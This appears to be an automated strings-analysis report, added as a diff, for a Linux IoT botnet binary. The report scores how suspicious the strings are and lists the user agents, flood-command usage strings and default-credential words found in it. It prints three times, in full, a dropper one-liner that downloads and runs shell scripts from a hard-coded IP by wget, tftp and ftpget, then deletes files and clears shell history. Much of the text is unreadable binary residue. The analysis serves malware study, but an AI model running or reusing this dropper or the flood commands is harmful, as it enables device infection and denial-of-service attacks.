@@ -1,0 +1,271 @@
+=============================================================================
+========	BINARY ID :bd5a619fbc8706ee3a9fa670a199c62788528747==================================================
+================================================================================
+================================================================================
+========	STRINGS SUMMARY : =====================================================
+================================================================================
+TOTAL STRINGS COUNT :2579
+SUPSCPECTED LINES COUNT :190
+SUPSCPECTED STRINGS COUNT (DISTINCT) :32
+SUPSCPECTED STRINGS WEIGHT :125
+SUSPECT STRING SCORE : [125 / 150] 83%
+USER AGENTS STRINGS COUNT :37
+STATIC IPs STRINGS COUNT :2
+DYNAMIC IPs STRINGS COUNT :1
+================================================================================
+========	STRINGS DETAILS : =====================================================
+================================================================================
+================================================================================
+========	SUSPECTED STRINGS : =====================================================
+================================================================================
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36
+Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36
+Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36
+Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)
+Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)
+Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)
+Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.166.150.230/bassboots.sh; chmod 777 bassboots.sh; sh bassboots.sh; tftp 188.166.150.230 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 188.166.150.230; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 188.166.150.230 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bassboots.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *;history -c\r\n
+telnet
+NetICs
+bintec
+netadmin
+attack
+system
+NETWORK
+extendnet
+NetVCR
+netgear
+synnet
+netopia
+/dev/netslink/
+/usr/
+/bin/sh
+PING
+A¼AÈAØAìAĀAČAĘAĤAİAļAŌAŘAŨAŴAƄAƐAƜAƨAƸAǈAǘAǤAǴAȄAȐAȜAȬAȰAȴAȸAȼAɄAɈAɌAɐA猥┠
+HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n
+Failed opening raw socket.
+Invalid flag "%s"
+REP STOPPING!
+HTTP
+HTTP %s Flooding %s:%d for %d seconds
+UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>
+TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)
+STD <target> <port> <time>
+/proc/net/route
+/etc/rc.d/rc.local
+fork failed\n
+\e[1;36m [ROOT] \e[1;32mBASSBOOTS!! \e[0;35m[IP] \e[1;33m| \e[1;32m%s \e[0;35m[Arch] \e[1;33m| \e[1;32m%s\e[34m
+STOLENBOTS
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+No such process
+Interrupted system call
+No child processes
+Too many open files in system
+Read-only file system
+Level 2 not synchronized
+Machine is not on the network
+Name not unique on network
+Interrupted system call should be restarted
+Socket operation on non-socket
+Protocol wrong type for socket
+Socket type not supported
+Network is down
+Network is unreachable
+Network dropped connection on reset
+Software caused connection abort
+Connection reset by peer
+Transport endpoint is already connected
+Transport endpoint is not connected
+Connection timed out
+Connection refused
+Host is down
+No route to host
+Operation already in progress
+Operation now in progress
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+/etc/hosts
+/etc/config/hosts
+fdopen_pids
+libc/sysdeps/linux/sh/vfork.S
+fork.c
+getpid.c
+kill.c
+sigprocmask.c
+waitpid.c
+spec_flags.4024
+strstr.c
+_string_syserrmsgs.c
+inet_ntoa.c
+inet_makeaddr.c
+gethostbyname.c
+gethostbyname_r.c
+connect.c
+socket.c
+rand.c
+random.c
+randtbl
+random_r.c
+random_poly_info
+__socketcall.c
+inet_aton.c
+dnslookup.c
+get_hosts_byname_r.c
+inet_pton4
+inet_ntop4
+read_etc_hosts_r.c
+__read_etc_hosts_r
+__socketcall
+waitpid
+random
+connect
+GetRandomPublicIP
+numpids
+initConnection
+inet_pton
+sendTCP
+__GI_random_r
+getpid
+getHost
+__libc_getpid
+makeRandomStr
+sendHTTP
+GetRandomIP
+__open_etc_hosts
+__dns_lookup
+random_r
+gethostbyname_r
+tcpcsum
+socket
+_string_syserrmsgs
+__GI_inet_ntoa
+srandom_r
+__GI_inet_ntoa_r
+__GI_srandom_r
+kill
+__GI_sigprocmask
+inet_addr
+connectTimeout
+__GI_kill
+strstr
+init_rand
+rand
+__GI_gethostbyname_r
+__GI_inet_ntop
+fork
+__GI_gethostbyname
+__GI_random
+__GI_fork
+__GI_getpid
+inet_aton
+processCmd
+get_telstate_host
+__GI_socket
+listFork
+srand
+sendUDP
+inet_ntoa
+__get_hosts_byname_r
+__GI_inet_pton
+gethostbyname
+__vfork
+__libc_waitpid
+socket_connect
+__GI_waitpid
+vfork
+srandom
+__libc_fork
+scanPid
+rand_cmwc
+inet_ntoa_r
+__GI_strstr
+__GI_connect
+inet_ntop
+__GI_inet_aton
+__GI_vfork
+__GI_inet_addr
+__libc_connect
+pids
+sigprocmask
+\t\tﰌ@Դ@ڌ@懣燸儝愐怜衣譅㋬儠戓爄㏬儱㈖褄惣灀Ḇꀃ\t懣煐Ḗ另戲愣焄僦‒愣愒戜懣然℠懣然戓爁∐懣燸儞拣父搓攣囧埨턝䄋\t凩ㄌḙꀑ\t懣燸儝愐愜戓懣燸儞搓攣턕䄋\t勩爁ḩ拣狸懣燸儝焁ም懣燸儝愐愜℘褁긍\t懣燸儞℘褅懣燸儞戒∐凩怓縸濣伦滶\v\tԴ@ӌ@
+\tûþÿ䀀üý鵀@懣燠儝焁愐戜鄳㈐謃週ḃꀂ\t鄮ḓ懣焟㋬戠℠懣燠儞拣爟錢搓攣朳턐䄋\t懣燠儝戓爂懣燠儞錒搓攣朳턈䄋\tḁ僡縠濣伦滶\v\týüþ䀀\t鵀@⾆
+\tÿ｀´¼鴘@⌬@镘@⒨@懣煴儚戓爂錦㏬儲㈓褏鄢阢㛬ㅬ儘䄕褆鄛鈛㋬ㄬ儙䄕謁꺿\t懣煴儜℘褃⸲ꀂ\t
+\t\tꔰ@ᎅ鋱ㄐB肁肀톎䄋\t톎〝Ċ戓㈌䈜ㄇㄚ挣㌘Ḵ凤䄭古ㄸ䄭勤ㄨ挃㌘Ḵ
+\tÀ¨¬©ÿÆà\tꔰ@ᎅ鋱ㄐB肁肀謁ꁆ\t텂愐怜蠇謁ꀿ\t턾愐怜蠋謁ꀸ\t턻愐怜蠕謁ꀱ\t턷愐怜蠖謁ꀪ\t턴愐怜蠚褤턱愐怜蠜褟턯愐怜蠝褚턬愐怜蠞褕턪愐怜蠡褐턧愐怜蠷褋턥愐戜酄㈐褅턢愐戜鄿㈐謁꺏\t揣猠⌒ጡጒጣ柣眠혙턗愐愜怓턕焁愐愜栓턓焂愐愜挓턐焃愐愜戓翸懳Ⅎᄡ摳散昃枃턌䄋\t缈懣焠搓턉䄋\t愃怓縰濣伦滶棶\v\tÖ×ㄐB4Aഈ@饼@
+\t\t睰@ʈ@Ꚍ@ꔰ@ǔ@ⶼ@颦@〔@飔@ᘼ@⸘@鵨@懣燴償愝搓턷䄋\tḃ懣焴儞焂レ态℁턲䄋\t戍懣焴儝焄℡懣焴儜搓턬䄋\t搃턫䄋\t懣焴儝ᄃ懣焴儖戓懣焴儝焂愑愝搣攓턣䄋\t戃懣焴儝焊℡僨凥【謌턝䄋\t懣焴償〗褟Ḩ꽯\t叨猁Ḹレ儃勩ㄠ謍㏬刴鄖ȗĚ搓턐䄋\tḉ꽘\t凩焁ḙ꽓\t忤繴濣伦滶棶\v\tϨ飔@ʈ@ⶼ@颦@⸘@睰@규@⾆
+$A鍼@ヰBΘAහ@ΠAΨA鍼B畔@άAμA狼@㉜@爤@πAꦠ@텸䄋\t 诔텷栒懣焄儔焄椒懣焄儔焈樒懣焄儔焌愒搓텯䄋\t欃懣焄儔焔愒搓텪䄋\t翸懳퉨↲ᄁ撃攣暓枣텦䄋\t缈懣焄儔焄愒栓懣焄儔焈愒椓懣焄儔焌愒搓텙䄋\t愍樓懣焄儔焐愒欓懣焄儔焔愒搓텐䄋\t氃懣焄儔焘愒搓텋䄋\t翸懳⇂ᄁ撃斓暣枳텉䄋\t缈텇䄋\t懣焄儔愒퉅搓攣텄䄋\t 褁ꆣ\t懣焄刕㈗謠懣焄儔焌愒搓턵䄋\t裿褕懣焄儔焈愒搓턯䄋\t裿褊懣焄儔焐愒搓턪䄋\t裿謁ꀿ\t懣焄儔焔愒搓턣䄋\t裿褳懣焄儔焔愒搓턞䄋\t턣〗褧懣焄儔焔愒搓턘䄋\t턞〗褛懣焄儔焐愒搓턒䄋\t〗褏懣焄倕蠇謭懣焄儔焘愒搓턉䄋\t䀕褢턆愒툏搓攣턆䄋\tꎹ\t\t⇸@ヰBꦠ@ψAහ@䘸@
+\t\tͬA鞰@⇸@䡀@爤@ѨA鍼@ꦠ@ヰBѬAහ@ḓ懣煄勣ᄧ懣焄刕㈗謋懣焄儔焘愒搓톇䄋\tḄꀂ\tḔ懣煄勤ᄨ懣煄儒搓톀䄋\t愃℘襇懣煄儒퉼搓攣텼䄋\t懣煄ᄉꀳ\t텹䄋\t 謤翴拳懣煄匙懣煄圓懣煄嘔懣煄倕懣煄儖−懣煄儘ሑ懣煄儗ሒ搳敳會텩䄋\t缌텧䄋\t텢攓텡䄋\t懣煄ᄉ懣煄儙℘诇ꀪ\t템䄋\t 謤翴拳懣煄匒懣煄圓懣煄嘔懣煄倕懣煄儖−懣煄儘ሑ懣煄儗ሒ搳敳會테䄋\t缌텊䄋\t懣焄儔愒퉈搓攣텇䄋\t 褁ꂻ\t懣焄刕㈗謕懣焄儔焈愒搓턶䄋\t䀕謊懣焄儔焌愒搓터䄋\t䀕褉턷愒툷搓攣턶䄋\tꃯ\t懣焄儔焄拣牄愒ሚ懣焄儔焈愒搓턢䄋\t懣煄ᄋ懣焄儔焌愒搓턜䄋\t懣煄ᄌ懣煄儚搓턗䄋\t愃℘謁ꁐ\t懣煄儚툓搓攣턒䄋\t懣煄ᄍꀻ\t턏䄋\t 謬懣煄初懣煄匛懣煄儜搣攳易턏䄋\t턇䄋\tꦠ@銼@ͬA鞰@⇸@乄@爤@
+\t\t\t\t恒兑剒␂ᐑ\vᐢ\t\t\t\t\t\t\t\t\t㔖謎䄅␚䑚윆┚䕚\v\v䑚
+\t\t\t\t\t\t\t恣⁋⁛♨贘젃恃ぬ贵㕈ㅧ痿輑捓䘁Ŝ輄珿♨贆—Ŝȼ䘐—迺․\v\t\v恃젃贅⌉䌐Ŝ盿迻—甁挃恓적輋㙳贄젂贬怳ꂪ\t赈怳ꂶ\t젂趃怳꾡\t\t捓ㅧ痼謻䘉䘁Ş輄珸♨贆‖ŞȾ䘐‖迺…\v\t\t\t\t\t\t\t\t\t\t\t\t痼权Ş看☨捓贂珼‖ŞȾぶ‖跺…甃㐀矶褃Ŝぶ跼—\v\t\t\t\t\t\t\t痼挃⌙扃〰爟贏∙Ş전晓盼贄猈젘贆‖Şݮ〰‖迺⁶⾆㔌⾖愃⾦痤⾶偐燠卑噒坓塔奕婖字ǃᄱᅢᅳᆄ痠ᆕㄠᆦ迬ᆷ怓毶㔘櫶
+\t\t\t\t\t\t晓痾扃盼爇ŝͭ〦―跺‵ꁂ\t\t\t\t挃⌙扃〰爟痾贅∙猂ŝ〰迼―⾆㔌⾖愃⾦痢⾶⿆恕燠捖晖䀨杖‽桖⍭楖♽橖➍歖⢝汕⦭ǃ⪽ᄱ
+\t\t癪ᨊ㨪婊抓揢狸慃圡猆ꁃ燼抓揢狴慃嘢猅ꀹ燸抓揢狰慃圣猄ꀯ燴抓揢独慃嘤猃ꀥ燰抓揢狨慃圥猂ꀛ燬抓揢狤慃嘦猁ꀑ燨抓狠圧慃ꀉ燤抓狜揢慃嘨燠珿圧ᅧ嘦ᅶ圥ᅥ嘤ᅴ圣ᅣ嘢ᅲ圡ᅡ珸昢⌸ⅲ狠迫燠ᅧꁞ櫢䰭➩毋㜖⊙捃笠贇爄윂żģ\t\t㠬ᰌꀝ狴櫢唢捃堡稂ꀭ珼狰櫢圣捃唢稁ꀝ珸独捃嘤圣ꀏ珴狨櫢堥捃嘤竿珰懋散䢽圣䔝慓
+================================================================================
+========	USER AGENTS STRINGS : =====================================================
+================================================================================
+Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)
+Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)
+Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00
+Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00
+Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00
+Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01
+Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0
+Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4
+Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7
+Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)
+Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51
+Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36
+Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36
+Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00
+Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)
+Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)
+Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)
+Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)
+Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)
+Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0
+HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n
+================================================================================
+========	STATIC IP ADRESSES : =====================================================
+================================================================================
+188.166.150.230:123
+8.8.8.8
+================================================================================
+========	DYNAMIC IP MASKS : =====================================================
+================================================================================
+%d.%d.%d.%d
+================================================================================
+========	/proc FOLDER ACCESS : =====================================================
+================================================================================
+/proc/net/route
+================================================================================
+========	HISTORY TEMPERING : =====================================================
+================================================================================
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.166.150.230/bassboots.sh; chmod 777 bassboots.sh; sh bassboots.sh; tftp 188.166.150.230 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 188.166.150.230; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 188.166.150.230 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bassboots.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *;history -c\r\n
+================================================================================
+========	AUTOINSTALL COMMANDS : =====================================================
+================================================================================
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.166.150.230/bassboots.sh; chmod 777 bassboots.sh; sh bassboots.sh; tftp 188.166.150.230 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 188.166.150.230; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 188.166.150.230 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bassboots.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *;history -c\r\n
